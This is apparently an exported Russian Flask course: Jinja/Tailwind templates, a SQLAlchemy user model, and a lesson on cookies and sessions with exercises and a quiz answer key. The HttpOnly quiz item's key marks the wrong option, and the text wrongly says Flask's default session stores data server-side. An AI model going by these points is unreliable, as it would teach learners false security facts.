&lt;/a&gt;\r\n \r\n          {% if current_user.is_authenticated %}\r\n          &lt;a href=\"{{ url_for('main.profile') }}\"\r\n            class=\"py-2 px-2 font-medium text-gray-500 hover:text-blue-500 transition duration-300\"&gt;\r\n            Профиль\r\n          &lt;/a&gt;\r\n          &lt;a href=\"{{ url_for('auth.logout') }}\"\r\n            class=\"py-2 px-4 font-medium text-white bg-red-500 rounded hover:bg-red-400 transition duration-300\"&gt;\r\n            Выход\r\n          &lt;/a&gt;\r\n          {% endif %}\r\n \r\n          {% if not current_user.is_authenticated %}\r\n          &lt;a href=\"{{ url_for('auth.login') }}\"\r\n            class=\"py-2 px-2 font-medium text-gray-500 hover:text-blue-500 transition duration-300\"&gt;\r\n            Вход\r\n          &lt;/a&gt;\r\n          &lt;a href=\"{{ url_for('auth.signup') }}\"\r\n            class=\"py-2 px-4 font-medium text-white bg-blue-500 rounded hover:bg-blue-400 transition duration-300\"&gt;\r\n            Регистрация\r\n          &lt;/a&gt;\r\n          {% endif %}\r\n        &lt;/div&gt;\r\n      &lt;/div&gt;\r\n    &lt;/div&gt;\r\n  &lt;/nav&gt;\r\n \r\n  &lt;div class=\"container mx-auto mt-10 px-4\"&gt;\r\n    {% block content %}\r\n    {% endblock %}\r\n  &lt;/div&gt;\r\n  \r\n&lt;/body&gt;\r\n&lt;/html&gt;</code></pre><p>&nbsp;Объяснение кода:</p><p><code>script src=\"</code><a href=\"https://www.google.com/search?q=https://cdn.tailwindcss.com\"><span style=\"color:windowtext;\"><code>https://cdn.tailwindcss.com</code></span></a><code>\"</code></p><p>Подключает фреймворк css tailwind с облачного хранилища.</p><p>Далее, в коде, следуют элементы интерфейса web приложения, к которым применяются многочисленные css-классы, каждый из которых имеет какую то визуальную реализацию описанную во фреймворке Tailwind.</p><p>Узнать значение каждого из них вы можете в ChatGPT, но в Tailwind таких классов многие сотни, и изучение фреймворка выходит за рамки данного курса.</p><p><code>if current_user.is_authenticated</code></p><p>Это встроенная проверка Flask-Login.</p><p>Если пользователь вошел, мы показываем кнопку \"Выход\", если нет — \"Вход\" и \"Регистрация\".</p><p><code>block content</code></p><p>Это \"окно\", в которое будут подставляться другие шаблоны.</p><p>&nbsp;</p><p><strong>2. Главная страница приложения</strong></p><p>Файл <code>project/templates/index.html</code>:</p><pre><code class=\"language-jinja2\">{% extends \"base.html\" %}\r\n \r\n{% block content %}\r\n&lt;div class=\"text-center\"&gt;\r\n  &lt;h1 class=\"text-50px font-bold text-gray-900 mb-4\"&gt;\r\n    Аутентификация во Flask\r\n  &lt;/h1&gt;\r\n  &lt;p class=\"text-xl text-gray-600\"&gt;\r\n    Добро пожаловать в учебное приложение изучения библиотеки Flask-Login.\r\n  &lt;/p&gt;\r\n&lt;/div&gt; {% endblock %}</code></pre><p>&nbsp;</p><p><strong>3. Модели данных</strong></p><p>Теперь опишем, как будет выглядеть наша таблица пользователей в базе данных.</p><p>Будем использовать SQLAlchemy 2.0 с типизацией.</p><p>Создайте файл <code>project/models.py</code>:</p><pre><code class=\"language-python\">from flask_login import UserMixin\r\nfrom sqlalchemy.orm import Mapped, mapped_column\r\nfrom . import db\r\n \r\nclass User(UserMixin, db.Model):\r\n  # Используем современный синтаксис Mapped для типизации\r\n  id: Mapped[int] = mapped_column(primary_key=True)\r\n  email: Mapped[str] = mapped_column(unique=True, nullable=False)\r\n  password: Mapped[str] = mapped_column(nullable=False)\r\n  name: Mapped[str] = mapped_column(nullable=False)</code></pre><p>&nbsp;Объяснение кода:</p><p><code>UserMixin</code></p><p>Добавляет в нашу модель необходимые для Flask-Login атрибуты (например, is_authenticated, get_id). Без этого Flask-Login не сможет управлять пользователем.</p><p>Mapped[str]</p><p>Это современный способ описания колонок. Он делает код понятнее и помогает редакторам кода (VS Code) подсказывать ошибки.</p><p><code>primary_key=True</code></p><p>Создает уникальный идентификатор для каждого пользователя.</p><p>&nbsp;</p><p><strong>4. Страница регистрации</strong></p><p>Создайте файл <code>project/templates/signup.html</code>:</p><pre><code class=\"language-jinja2\">{% extends \"base.html\" %}\r\n \r\n{% block content %}\r\n&lt;div class=\"max-w-md mx-auto bg-white p-8 border border-gray-200 rounded-lg shadow-sm\"&gt;\r\n  &lt;h2 class=\"text-2xl font-bold text-center mb-6\"&gt;\r\n    Регистрация\r\n  &lt;/h2&gt;\r\n  &lt;form method=\"POST\" action=\"/signup\"&gt;\r\n    &lt;div class=\"mb-4\"&gt;\r\n      &lt;label class=\"block text-gray-700 text-sm font-bold mb-2\"&gt;\r\n        Email\r\n      &lt;/label&gt;\r\n      &lt;input type=\"email\"\r\n             name=\"email\"\r\n             placeholder=\"email@example.com\"\r\n              class=\"w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500\"\r\n              required&gt;\r\n    &lt;/div&gt;\r\n    &lt;div class=\"mb-4\"&gt;\r\n      &lt;label class=\"block text-gray-700 text-sm font-bold mb-2\"&gt;\r\n        Имя\r\n      &lt;/label&gt;\r\n      &lt;input type=\"text\"\r\n             name=\"name\"\r\n             placeholder=\"Ваше имя\"\r\n             class=\"w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500\"\r\n             required&gt;\r\n    &lt;/div&gt;\r\n    &lt;div class=\"mb-6\"&gt;\r\n      &lt;label class=\"block text-gray-700 text-sm font-bold mb-2\"&gt;\r\n        Пароль\r\n      &lt;/label&gt;\r\n      &lt;input type=\"password\"\r\n             name=\"password\"\r\n             placeholder=\"********\"\r\n             class=\"w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500\"\r\n             required&gt;\r\n    &lt;/div&gt;\r\n    &lt;button type=\"submit\"\r\n            class=\"w-full bg-blue-500 text-white font-bold py-2 px-4 rounded hover:bg-blue-600 transition duration-300\"&gt;\r\n            Зарегистрироваться\r\n    &lt;/button&gt;\r\n  &lt;/form&gt;\r\n&lt;/div&gt;\r\n{% endblock %}</code></pre><p>Объяснение:</p><p>Здесь мы создали форму с методом POST, связанную с обработчиком маршрута <code>/signup</code>.</p><p>Данные из полей \"email\", \"name\" и \"password\" будут отправлены на сервер, когда пользователь нажмет кнопку. <code>Зарегистрироваться</code></p><p>&nbsp;</p><p><strong>5. Инициализация базы данных</strong></p><p>Чтобы таблицы базы данных физически создались в файле db.sqlite, нам нужно выполнить инициализацию.</p><p>В корне проекта (т.е. рядом с файлом <code>.env</code> создайте файл <code>init_db.py</code></p><pre><code class=\"language-python\">from project import db, create_app\r\n \r\n# 1. Создаем экземпляр приложения\r\napp = create_app()\r\n \r\n# 2. Входим в контекст приложения и создаем таблицы\r\nwith app.app_context():\r\n    db.create_all()\r\n    print(\"База данных успешно инициализирована!\")</code></pre><p>Объяснение кода:</p><p><code>create_app()</code></p><p>Вызывает нашу фабрику приложений, чтобы Flask узнал все настройки (где лежит база данных и какие в ней есть модели).</p><p><code>with app.app_context()</code></p><p>Flask спроектирован так, что база данных не может \"общаться\" с приложением просто так. Этой строкой мы создаем временную связь (контекст), внутри которой база данных понимает, к какому приложению она относится.</p><p><code>db.create_all()</code></p><p>Эта команда сканирует файл models.py, находит там класс User и автоматически создает таблицу в файле db.sqlite со всеми нужными колонками (id, email, password и т.д.).</p><p>&nbsp;</p><p>Теперь сделайте одноразовый запуск файла для первичной инициализации базы данных, командой в терминале:</p><p><code>python init_db.py</code></p><p>После отработки кода этого файла, в корне проекта создастся папка <code>instance</code>, а в ней файл базы данных <code>db.sqlite</code></p><p>&nbsp;</p><p>Теперь, когда база данных создана, в следующей лекции, мы можем переходить к функционалу регистрации и авторизации.</p><p>&nbsp;</p><p>&nbsp;</p><p><strong>Теория. Что такое Flask-SQLAlchemy ?</strong></p><p>Flask-SQLAlchemy — это расширение для Flask, которое предоставляет интеграцию с библиотекой SQLAlchemy, одной из самых мощных и популярных библиотек для работы с базами данных в Python. Flask-SQLAlchemy объединяет удобство работы с объектно-реляционным отображением (ORM) и гибкость использования \"чистого\" SQL, предоставляя разработчикам удобный способ управлять данными в приложениях Flask.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p><p>Что такое SQLAlchemy?</p><p>SQLAlchemy — это библиотека для работы с базами данных, которая предоставляет:</p><p>1 - ORM (Object-Relational Mapping): Позволяет работать с базой данных, используя Python-классы и объекты вместо SQL-запросов.</p><p>2 - SQL Expression Language: Даёт возможность писать сложные SQL-запросы на Python, если требуется больше контроля.</p><p>Основные особенности Flask-SQLAlchemy:</p><p>1 - Интеграция с Flask: Расширение автоматически использует настройки Flask для работы с базой данных, такие как SQLALCHEMY_DATABASE_URI и SQLALCHEMY_TRACK_MODIFICATIONS.</p><p>2 - ORM: Позволяет описывать таблицы базы данных в виде Python-классов (моделей).</p><p>3 - Миграции: Легко интегрируется с инструментами для миграций базы данных, например, Flask-Migrate.</p><p>4 - Сессии и транзакции: Управляет сессиями баз данных, позволяя безопасно работать с транзакциями.</p><p>5 - Поддержка множества СУБД: Работает с SQLite, MySQL, PostgreSQL, Oracle и другими.</p><p>&nbsp;&nbsp;</p><p><strong>Теория. Что такое Tailwind CSS ?</strong></p><p>Tailwind CSS — это фреймворк для стилизации веб-страниц, который отличается от классических инструментов (вроде Bootstrap) своим подходом. Вместо готовых компонентов, таких как кнопки или карточки, он предоставляет набор мелких служебных классов.</p><p>Принципы работы Tailwind CSS:</p><p>- Утилитарный подход Вам не нужно писать отдельный CSS-код в файлах .css. Вы строите дизайн прямо в HTML, комбинируя готовые классы. Например, чтобы сделать текст красным, добавить внутренние отступы и скруглить углы, вы просто пишете: class=\"text-red-500 p-4 rounded-lg\".</p><p>- Отсутствие лишнего кода Tailwind поставляется с инструментом, который при сборке проекта анализирует ваш HTML и оставляет в итоговом CSS-файле только те классы, которые вы реально использовали. Это делает финальный файл стилей очень легким.</p><p>- Гибкость и адаптивность Фреймворк позволяет легко создавать адаптивный дизайн с помощью префиксов. Например, класс md:flex применит свойство flex только на экранах среднего размера и больше. Это избавляет от написания медиа-запросов вручную.</p><p>- Дизайн-система из коробки В Tailwind уже настроены гармоничные палитры цветов, размеры шрифтов и сетки отступов. Это помогает соблюдать единообразие в интерфейсе без необходимости придумывать значения для каждого элемента.</p><p>Зачем это нужно: Разработчики выбирают Tailwind, потому что он ускоряет верстку: не нужно постоянно переключаться между HTML и CSS файлами и придумывать названия для классов (типа .wrapper или .main-container).</p><p>&nbsp;</p>"
            },
            "is_published": true
        },
        {
            "id": 10,
            "section_id": 1,
            "number": 7,
            "name": "cookie и session",
            "slug": "cookie-session",
            "content": {
                "tasks": [
                    {
                        "id": 1,
                        "content": "<p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">Создайте</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\"> </span><span style=\"mso-themecolor:text1;\">маршрут</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"> /set_session/, </span><span style=\"mso-themecolor:text1;\">который</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\"> </span><span style=\"mso-themecolor:text1;\">сохраняет</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\"> </span><span style=\"mso-themecolor:text1;\">в</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"> session </span><span style=\"mso-themecolor:text1;\">имя</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\"> </span><span style=\"mso-themecolor:text1;\">пользователя</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\"> </span><span style=\"mso-themecolor:text1;\">и</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\"> </span><span style=\"mso-themecolor:text1;\">выбранную</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\"> </span><span style=\"mso-themecolor:text1;\">тему</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\"> </span><span style=\"mso-themecolor:text1;\">оформления</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"> (</span><span style=\"mso-themecolor:text1;\">например</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">, 'light' </span><span style=\"mso-themecolor:text1;\">или</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"> 'dark').<o:p></o:p></span></span></p>"
                    },
                    {
                        "id": 2,
                        "content": "<p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">Создайте маршрут /get_session/, который выводит все данные из session в виде текста.<o:p></o:p></span></span></p>"
                    },
                    {
                        "id": 3,
                        "content": "<p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">Реализуйте маршрут /logout_session/, который удаляет данные о пользователе из session.<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">Попробуйте перейти на /get_session/ после выхода и убедитесь, что все данные удалены.<o:p></o:p></span></span></p>"
                    },
                    {
                        "id": 4,
                        "content": "<p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">Реализуйте маршрут /check_user/, который проверяет: если в session есть ключ username, выводится приветствие пользователя, иначе перенаправление на /set_session/.<o:p></o:p></span></span></p>"
                    }
                ],
                "tests": [
                    {
                        "id": 1,
                        "options": [
                            "Для безопасного хранения состояния пользователя между HTTP-запросами ",
                            "Для хранения HTML-страниц сайта",
                            "Для шифрования всех пользовательских данных",
                            "Для передачи данных между разными серверами"
                        ],
                        "question": "Для чего чаще всего используется session в Flask?",
                        "correct_index": 0
                    },
                    {
                        "id": 2,
                        "options": [
                            "Session хранится в браузере, а cookie — на сервере",
                            "Cookie хранятся в браузере, а session хранит данные на сервере и использует cookie только для идентификатора ",
                            "Cookie и session полностью идентичны",
                            "Cookie используются только для ошибок 404, а session — для логина"
                        ],
                        "question": "Какая ключевая разница между cookie и session?",
                        "correct_index": 1
                    },
                    {
                        "id": 3,
                        "options": [
                            "Позволяет cookie использоваться только при POST-запросах",
                            "Шифрует содержимое cookie",
                            "Запрещает доступ к cookie из JavaScript, повышая безопасность ",
                            "Позволяет cookie хранить длинные строки"
                        ],
                        "question": "Что делает параметр HttpOnly при установке cookie?",
                        "correct_index": 0
                    },
                    {
                        "id": 4,
                        "options": [
                            "request.cookies('cookie_name')",
                            "request.cookies.get('cookie_name') ",
                            "response.cookies['cookie_name']",
                            "cookies.get('cookie_name')"
                        ],
                        "question": "Как получить значение cookie в Flask?",
                        "correct_index": 1
                    },
                    {
                        "id": 5,
                        "options": [
                            "request.session['username'] = 'Alex'",
                            "response.set_session('username', 'Alex')",
                            "session['username'] = 'Alex' ",
                            "session.set('username', 'Alex')"
                        ],
                        "question": "Как сохранить данные в session в Flask?",
                        "correct_index": 2
                    },
                    {
                        "id": 6,
                        "options": [
                            "session.pop('username', None) или session.clear() ",
                            "del cookie['username']",
                            "response.delete_cookie('username')",
                            "request.cookies.remove('username')"
                        ],
                        "question": "Как удалить данные пользователя из session?",
                        "correct_index": 0
                    }
                ],
                "theory_html": "<h4>Установка и чтение cookie.</h4><p><span style=\"color:black;\"><span>В web-приложениях часто требуется сохранять состояние пользователя между отдельными HTTP-запросами, например информацию о текущей сессии, выбранном языке интерфейса или идентификаторе корзины покупок.</span></span></p><p><span style=\"color:black;\"><span>Для этого используется механизм cookie — небольшие фрагменты данных, которые сервер сохраняет в браузере пользователя в виде пар «ключ–значение». Эти данные автоматически отправляются браузером серверу при последующих HTTP-запросах к тому же сайту.</span></span></p><p><span style=\"color:black;\"><span>Важно понимать, что cookie не предназначены для хранения чувствительных или объёмных пользовательских данных (таких как логины, пароли или содержимое корзины товаров). В реальных приложениях cookie используются в основном для хранения идентификаторов и служебной информации, а сами данные хранятся на сервере.</span></span></p><p><span style=\"color:black;\"><span>В рамках данной лекции мы рассмотрим базовый механизм установки и чтения cookie. Более безопасный и практичный способ работы с пользовательским состоянием с использованием session будет рассмотрен далее в этой лекции.</span></span></p><p>&nbsp;</p><p><span style=\"color:black;\"><span></span></span></p><p><span style=\"color:black;\"><span></span></span></p><p><span style=\"color:black;\"><span>1. Импорт необходимых компонентов</span></span></p><p><span style=\"color:black;\"><span>Перед работой с cookie необходимо импортировать объект HTTP-запроса request, а также функцию make_response, которая позволяет работать с объектом HTTP-ответа.</span><span>&nbsp;&nbsp;</span></span></p><p><span style=\"color:black;\"><span>request - запрос. response - ответ. make - сделай.</span></span></p><p><span style=\"color:black;\"><span>Добавьте</span><span> </span><span>в</span><span> </span><span lang=\"EN-US\">app.py:</span></span></p><p><span style=\"color:black;\"><code><span lang=\"EN-US\">from flask import request</span></code></span></p><p><span style=\"color:black;\"><code><span lang=\"EN-US\">from flask import make_response</span></code><span lang=\"EN-US\"></span></span></p><p><span style=\"color:black;\"><span>(помните, что все импорты пишутся в самом начале файла. Можно всё записать в одну строку через запятую)</span></span></p><p><span style=\"color:black;\"><span></span></span></p><p>&nbsp;</p><p><span style=\"color:black;\"><span>2. Установка cookie</span></span></p><p><span style=\"color:black;\"><span>Для примера установим cookie при заходе пользователя на главную страницу.</span></span></p><p><span style=\"color:black;\"><span>(Поскольку это учебный и временный пример, текущий код обработчика маршрута главной страницы рекомендуется закомментировать.)</span></span></p><pre><code class=\"language-python\">@app.route(\"/\")<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\ndef index():<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp; response = make_response(render_template(\"index.html\", title=\"Главная\"))<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp; response.set_cookie(<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'username',<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'the user name',<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; httponly=True,<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; secure=True,<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; samesite='Lax'<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp; )<span style=\"color:black;\"><span></span></span>\r\n &nbsp;&nbsp; return response<span style=\"color:black;\"><span></span></span></code></pre><p><span style=\"color:black;\"><span>В данном примере мы устанавливаем cookie с именем 'username' и значением '</span><span lang=\"EN-US\">the</span><span lang=\"EN-US\"> </span><span lang=\"EN-US\">user</span><span lang=\"EN-US\"> </span><span lang=\"EN-US\">name</span><span>'.</span></span></p><p><span style=\"color:black;\"><span>Обратите внимание, что cookie устанавливаются не напрямую в маршруте, а через объект HTTP-ответа response. Именно поэтому используется функция make_response(), в которую передаётся сформированная страница, а затем к этому объекту добавляется cookie с помощью метода set_cookie().</span></span></p><p><span style=\"color:black;\"><span>Чтобы убедиться, что cookie был установлен, откройте инструменты разработчика браузера (клавиша F12), перейдите на вкладку Application, затем в раздел Cookies и выберите адрес текущего сайта. В таблице вы увидите установленную пару </span><code><span>Name : Value</span></code><span>.</span></span></p><p><span style=\"color:black;\"><span></span></span></p><p>&nbsp;</p><p><span style=\"color:black;\"><span>3. Параметры безопасности cookie</span></span></p><p><span style=\"color:black;\"><span>В современных web-приложениях обязательно использовать параметры безопасности cookie:</span></span></p><p><span style=\"color:black;\"><span>HttpOnly — запрещает доступ к cookie из JavaScript, снижая риск XSS-атак.</span></span></p><p><span style=\"color:black;\"><span>Secure — cookie передаётся только по HTTPS-соединению.</span></span></p><p><span style=\"color:black;\"><span>SameSite — ограничивает передачу cookie при межсайтовых запросах и защищает от CSRF-атак.</span></span></p><p><span style=\"color:black;\"><span>Почему именно ='</span><span lang=\"EN-US\">Lax</span><span>', и какие есть ещё значения у SameSite - разберитесь самостоятельно.</span></span></p><p><span style=\"color:black;\"><span>Что такое CSRF-атаки - разберитесь самостоятельно.</span></span></p><p><span style=\"color:black;\"><span>Использование этих параметров является обязательным стандартом.</span></span></p><p><span style=\"color:black;\"><span></span></span></p><p>&nbsp;</p><p><span style=\"color:black;\"><span>4. Чтение cookie</span></span></p><p><span style=\"color:black;\"><span>Теперь получим установленный cookie.</span></span></p><p><span style=\"color:black;\"><span>Для этого создадим отдельный маршрут /get_cookies/, который просто выведет значение cookie:</span></span></p><pre><code class=\"language-python\">@app.route('/get_cookies/')<span style=\"color:black;\"><span></span></span>\r\ndef get_cookies():<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp; username = request.cookies.get('username')<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp; return f'username: {username}'<span style=\"color:black;\"><span lang=\"EN-US\"></span></span></code></pre><p><span style=\"color:black;\"><span>Перейдите</span><span> </span><span>в</span><span> </span><span>браузере</span><span> </span><span>по</span><span> </span><span>адресу</span><span lang=\"EN-US\">:</span></span></p><p><span style=\"color:black;\"><code><span>http://127.0.0.1:5000/get_cookies/</span></code><span></span></span></p><p><span style=\"color:black;\"><span>Вы увидите значение cookie, считанное из объекта HTTP-запроса request.</span></span></p><p><span style=\"color:black;\"><span>Cookie доступны через свойство request.cookies, которое представляет собой словарь.</span></span></p><p><span style=\"color:black;\"><span></span></span></p><p>&nbsp;</p><p><span style=\"color:black;\"><span>Задание 1.</span></span></p><p><span style=\"color:black;\"><span>Создайте отдельный маршрут /set_cookie/, который устанавливает cookie.</span></span></p><p><span style=\"color:black;\"><span>Cookie должны устанавливаться при переходе по адресу:</span></span></p><p><span style=\"color:black;\"><span>http://127.0.0.1:5000/set_cookie/</span></span></p><p><span style=\"color:black;\"><span>Перейдите затем по маршруту /get_cookies/ и убедитесь, что cookie установлены.</span></span></p><p><span style=\"color:black;\"><span></span></span></p><p>&nbsp;</p><p><span style=\"color:black;\"><span>Задание 2.</span></span></p><p><span style=\"color:black;\"><span>Представьте, что необходимо записать в cookie длинную строку.</span></span></p><p><span style=\"color:black;\"><span>Сохраните эту строку в переменную Python и передайте переменную в метод set_cookie().</span></span></p><p><span style=\"color:black;\"><span>Убедитесь, что cookie корректно устанавливаются.</span></span></p><p><span style=\"color:black;\"><span></span></span></p><p><span style=\"color:black;\"><span>После выполнения заданий удалите (или закомментируйте) маршрут /get_cookies/ и восстановите исходный код обработчика главной страницы.</span></span></p><p>&nbsp;</p><p><span style=\"color:black;\"><span></span></span></p><p><span style=\"color:black;\"><span></span></span></p><h4>Работа с session в Flask</h4><p><span style=\"color:black;\"><span>В современных Flask-приложениях почти всегда используется session вместо прямой работы с cookie для хранения состояния пользователя.</span></span></p><p><span style=\"color:black;\"><span>Почему session предпочтительнее:</span></span></p><p><span style=\"color:black;\"><span>Cookie в браузере содержат только идентификатор сессии, а все данные хранятся на сервере или защищённо подписываются.</span></span></p><p><span style=\"color:black;\"><span>Session автоматически защищает данные с помощью подписи (с использованием SECRET_KEY).</span></span></p><p><span style=\"color:black;\"><span>Проще работать с безопасными и структурированными данными (например, словарями или списками).</span></span></p><p><span style=\"color:black;\"><span></span></span></p><p>&nbsp;</p><p><span style=\"color:black;\"><span>1. Настройка </span><span lang=\"EN-US\">session</span><span></span></span></p><p><span style=\"color:black;\"><span>Сначала импортируйте компонент (объект, класс) для работы с сессиями:</span></span></p><p class=\"a\"><span style=\"color:black;\"><code><span lang=\"EN-US\">from</span><span lang=\"EN-US\"> </span><span lang=\"EN-US\">flask</span><span lang=\"EN-US\"> </span><span lang=\"EN-US\">import</span><span lang=\"EN-US\"> </span><span lang=\"EN-US\">session</span></code><span></span></span></p><p><span style=\"color:black;\"><span>Также, для работы с session необходимо задать секретный ключ приложения:</span></span></p><p><span style=\"color:black;\"><span>Запишите после </span><span lang=\"EN-US\">app</span><span> = </span><span lang=\"EN-US\">Flask</span><span>(__</span><span lang=\"EN-US\">name</span><span>__) следующий код:</span></span></p><p class=\"a\"><span style=\"color:black;\"><code><span lang=\"EN-US\">app.secret_key = 'your_secret_key_here'</span><span lang=\"EN-US\">&nbsp;</span></code><span lang=\"EN-US\"></span></span></p><p class=\"a\"><span style=\"color:black;\"><span>Внимание! Генерируйте случайный ключ в реальном приложении!</span></span></p><p><span style=\"color:black;\"><span>secret_key используется Flask для подписи данных сессии и предотвращения подделки cookie.</span></span></p><p><span style=\"color:black;\"><span></span></span></p><p>&nbsp;</p><p><span style=\"color:black;\"><span>2. Установка данных в session</span></span></p><p><span style=\"color:black;\"><span>Для сохранения данных пользователя в session используем объект session как словарь.</span></span></p><p><span style=\"color:black;\"><span>Создайте обработчик маршрута </span><span lang=\"EN-US\">login</span><span> (или измените)</span></span></p><pre><code class=\"language-python\">@app.route(\"/login/\")<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\ndef login():<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp; # Сохраняем имя пользователя в session<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp; session['username'] = 'Alex'<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp; return \"Пользователь Alex вошёл в систему\"<span style=\"color:black;\"><span lang=\"EN-US\"></span></span></code></pre><p><span style=\"color:black;\"><span>В этом примере при переходе на маршрут /login/ в session сохраняется ключ 'username' со значением 'Alex'.</span></span></p><p><span style=\"color:black;\"><span>В браузере при этом будет храниться только идентификатор сессии, а данные безопасно подписаны сервером.</span></span></p><p><span style=\"color:black;\"><span></span></span></p><p>&nbsp;</p><p><span style=\"color:black;\"><span>3. Чтение данных из session</span></span></p><p><span style=\"color:black;\"><span>Для получения информации из session используем ключ словаря.</span></span></p><p><span style=\"color:black;\"><span>Создайте обработчик нового маршрута</span></span></p><pre><code class=\"language-python\">@app.route(\"/profile/\")<span style=\"color:black;\"><span></span></span>\r\ndef profile():<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp; username = session.get('username', 'Гость')<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp; return f'Пользователь: {username}'<span style=\"color:black;\"><span></span></span></code></pre><p><span style=\"color:black;\"><span>Если в session нет ключа 'username', возвращается значение по умолчанию 'Гость'.</span></span></p><p><span style=\"color:black;\"><span></span></span></p><p>&nbsp;</p><p><span style=\"color:black;\"><span>4. Удаление данных из session.</span></span></p><p><span style=\"color:black;\"><span>Для удаления данных из session можно использовать pop() или clear().</span></span></p><p><span style=\"color:black;\"><span>Создайте обработчик нового маршрута выхода из сессии (в нашем случае из профиля):</span></span></p><pre><code class=\"language-python\">@app.route(\"/logout/\")<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\ndef logout():<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp; session.pop('username', None) <span style=\"color:black;\"><span></span></span>\r\n &nbsp;&nbsp; return \"Пользователь вышел из системы\"<span style=\"color:black;\"><span></span></span></code></pre><p><span style=\"color:black;\"><span>Строка кода:</span></span></p><p class=\"a\"><span style=\"color:black;\"><code><span lang=\"EN-US\">session</span><span>.</span><span lang=\"EN-US\">pop</span><span>('</span><span lang=\"EN-US\">username</span><span>', </span><span lang=\"EN-US\">None</span><span>)</span></code><span></span></span></p><p><span style=\"color:black;\"><span>удаляет ключ '</span><span lang=\"EN-US\">username</span><span>', если он существует, а если не существует, возвращает </span><span lang=\"EN-US\">None</span><span>.</span></span></p><p><span style=\"color:black;\"><span>Можно удалить все данные сессии:</span></span></p><p class=\"a\"><span style=\"color:black;\"><code><span lang=\"EN-US\">session.clear()</span></code><span lang=\"EN-US\"></span></span></p><p><span style=\"color:black;\"><span lang=\"EN-US\"></span></span></p><p>&nbsp;</p><p><span style=\"color:black;\"><span>Преимущества</span><span lang=\"EN-US\"> session </span><span>над</span><span lang=\"EN-US\"> cookie</span></span></p><table style=\"border-collapse:collapse;border:none;mso-border-alt:solid windowtext .5pt;mso-border-insideh:.5pt solid windowtext;mso-border-insidev:.5pt solid windowtext;mso-padding-alt:0cm 2.85pt 0cm 2.85pt;mso-yfti-tbllook:1184;\" border=\"1\" cellspacing=\"0\" cellpadding=\"0\"><thead><tr><td style=\"border:solid windowtext 1.0pt;mso-border-alt:solid windowtext .5pt;padding:0cm 2.85pt 0cm 2.85pt;\"><p class=\"a0\" style=\"text-align:center;\">Session</p></td><td style=\"border-left:none;border:solid windowtext 1.0pt;mso-border-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;padding:0cm 2.85pt 0cm 2.85pt;\"><p class=\"a0\" style=\"text-align:center;\">Прямые cookie</p></td></tr></thead><tbody><tr><td style=\"border-top:none;border:solid windowtext 1.0pt;mso-border-alt:solid windowtext .5pt;mso-border-top-alt:solid windowtext .5pt;padding:0cm 2.85pt 0cm 2.85pt;\"><p class=\"a0\">Данные подписаны и защищены</p></td><td style=\"border-bottom:solid windowtext 1.0pt;border-left:none;border-right:solid windowtext 1.0pt;border-top:none;mso-border-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;mso-border-top-alt:solid windowtext .5pt;padding:0cm 2.85pt 0cm 2.85pt;\"><p class=\"a0\">Хранятся в открытом виде в браузере</p></td></tr><tr><td style=\"border-top:none;border:solid windowtext 1.0pt;mso-border-alt:solid windowtext .5pt;mso-border-top-alt:solid windowtext .5pt;padding:0cm 2.85pt 0cm 2.85pt;\"><p class=\"a0\">Поддержка структурированных данных (словарь, 